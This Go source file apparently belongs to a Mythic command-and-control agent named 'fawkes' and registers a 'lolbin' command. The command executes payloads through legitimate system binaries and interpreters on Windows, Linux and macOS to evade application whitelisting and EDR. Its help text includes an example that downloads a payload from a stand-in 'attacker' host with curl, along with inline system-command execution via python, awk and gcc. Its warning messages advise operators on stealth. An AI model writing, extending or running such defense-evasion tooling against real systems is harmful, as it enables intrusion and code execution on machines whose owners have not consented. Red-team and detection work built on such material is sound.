package agentfunctions

import (
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "lolbin",
		Description:         "LOLBin/GTFOBin proxy execution — execute payloads through legitimate system binaries to bypass application whitelisting and EDR. Windows: rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil. Linux: python, curl, wget, gcc, perl, ruby, node, awk. macOS: osascript, swift, open, python, curl.",
		HelpString:          "# Windows\nlolbin -action rundll32 -path C:\\payload.dll -export DllMain\nlolbin -action certutil -path C:\\encoded.b64\n# Linux (GTFOBins)\nlolbin -action python -path 'import os; os.system(\"id\")'\nlolbin -action curl -path http://attacker/payload -args '-o /tmp/p'\nlolbin -action gcc -path '#include <stdlib.h>\\nint main(){system(\"id\");return 0;}'\nlolbin -action awk -path 'BEGIN{system(\"id\")}'\n# macOS\nlolbin -action osascript -path 'display dialog \"Hello\"'\nlolbin -action swift -path 'import Foundation; print(\"Hello\")'",
		Version:             3,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1218", "T1218.011", "T1218.007", "T1218.009", "T1218.005", "T1218.010", "T1218.004", "T1059", "T1059.002", "T1059.006", "T1059.007", "T1105", "T1027.004"},
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
			CommandCanOnlyBeLoadedLater: true,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"rundll32", "msiexec", "regsvcs", "regasm", "mshta", "certutil", "regsvr32", "installutil", "python", "curl", "wget", "gcc", "perl", "ruby", "node", "awk", "osascript", "swift", "open"},
				Description:   "LOLBin/GTFOBin technique. Windows: rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil. Linux: python, curl, wget, gcc, perl, ruby, node, awk. macOS: osascript, swift, open, python, curl.",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     1,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "path",
				CLIName:       "path",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Payload path, inline code, or URL depending on action. Windows: file path. Linux/macOS: inline code (python/perl/ruby/node/awk/gcc/osascript/swift) or URL (curl/wget) or app name (open).",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     2,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "export",
				CLIName:       "export",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "DllMain",
				Description:   "DLL export function name (for rundll32 action only)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "args",
				CLIName:       "args",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Additional arguments to pass to the LOLBin",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
						GroupName:            "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			path, _ := taskData.Args.GetStringArg("path")
			var msg string
			switch action {
			case "rundll32", "msiexec", "regsvcs", "regasm", "mshta", "certutil":
				msg = fmt.Sprintf("OPSEC WARNING: Signed binary proxy execution via %s (T1218). Executing '%s' through a LOLBin. EDR products monitor child processes of signed binaries. Command-line arguments will be visible in process creation logs (Sysmon Event ID 1).", action, path)
			case "python", "perl", "ruby", "node":
				msg = fmt.Sprintf("OPSEC WARNING: Script interpreter execution via %s (T1059). Inline code execution spawns a child process. Command-line arguments (including code) are visible in /proc and process listing. Consider using a script file instead for stealth.", action)
			case "curl", "wget":
				msg = fmt.Sprintf("OPSEC WARNING: File download via %s (T1105). URL '%s' will be visible in process arguments and potentially in proxy logs. Network connections to external hosts may trigger IDS/IPS alerts.", action, path)
			case "gcc":
				msg = "OPSEC WARNING: Compile-and-execute via gcc (T1027.004). Source file written to /tmp, compiled binary created. Both artifacts should be cleaned up. Compilation process is unusual on production servers."
			case "awk":
				msg = fmt.Sprintf("OPSEC WARNING: Command execution via awk (T1059). Awk system() calls spawn child processes visible in process tree. Program: '%s'", path)
			case "osascript":
				msg = fmt.Sprintf("OPSEC WARNING: AppleScript/JXA execution via osascript (T1059.002). Script execution may trigger TCC prompts for protected resources. Code visible in process arguments.")
			case "swift":
				msg = "OPSEC WARNING: Swift code compilation and execution (T1059). Requires Xcode CLI tools. Temp file created for compilation. Unusual process on non-developer machines."
			case "open":
				msg = fmt.Sprintf("OPSEC WARNING: Application launch via open command (T1204.002). Launching '%s'. May trigger UI elements visible to the user.", path)
			default:
				msg = fmt.Sprintf("OPSEC WARNING: LOLBin/GTFOBin execution via %s. Process creation will be logged.", action)
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			path, _ := taskData.Args.GetStringArg("path")
			display := fmt.Sprintf("%s → %s", action, path)
			response.DisplayParams = &display
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			host := processResponse.TaskData.Callback.Host
			logOperationEvent(processResponse.TaskData.Task.ID,
				fmt.Sprintf("[DEFENSE EVASION] LOLBIN proxy execution (%s) on %s", action, host), true)
			return response
		},
	})
}
